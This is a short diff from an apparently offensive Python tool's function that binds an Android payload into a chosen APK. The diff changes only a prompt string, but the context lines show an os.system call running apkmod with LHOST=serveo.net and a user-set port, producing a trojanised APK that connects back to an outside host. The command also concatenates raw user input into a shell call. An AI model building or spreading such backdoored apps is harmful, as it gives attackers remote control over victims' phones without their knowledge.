@@ -178,7 +178,7 @@ def generateandroidpayload():
            [4] None. exit application''')
     q1 = input()
     if q1 == '1':
-        q2 = input("Please enter path of apk you want to bind to.")
+        q2 = input("Please enter path of apk you want to bind to: ")
         prLightPurple("Binding....Please be Patient[*]")
         os.system("apkmod -b " + q2 + " -o $HOME/downloads/androidpayloadbinded.apk LHOST=serveo.net LPORT=" + x)
         prGreen("Binded payload is saved as $HOME/downloads/androidpayloadbinded.apk")
